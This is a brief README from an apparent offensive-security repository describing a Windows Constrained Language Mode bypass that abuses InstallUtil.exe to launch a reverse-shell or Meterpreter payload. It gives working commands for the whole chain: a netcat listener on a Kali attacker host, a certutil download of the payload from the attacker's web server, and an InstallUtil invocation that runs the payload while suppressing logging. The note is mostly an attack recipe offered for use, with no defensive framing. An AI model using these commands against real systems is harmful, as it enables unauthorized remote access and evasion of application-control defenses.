# Reverse Shell CLM Bypass with Meterpreter DLL
A .NET installation utility used for registering .NET assemblies can be used and reference the RunInstaller component to trigger the malicious payload that is not found in the 'main' call. 

Compile the csharp binary in Visual Studio and transfer to victim host with certutil. 


## Requirements: 
The following powershell code runner is required and hosted on kali webserver (python http.server)
Reference: CodeRunners/powershellCodeRunner-32.ps1
Reference: CodeRunners/powershellCodeRunner-64.ps1

```bash
# setup netcat listener
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8080

# Download file via certutil -urlcache -f http://ip/CLMBypass-shell.exe shell.exe
PS > C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
```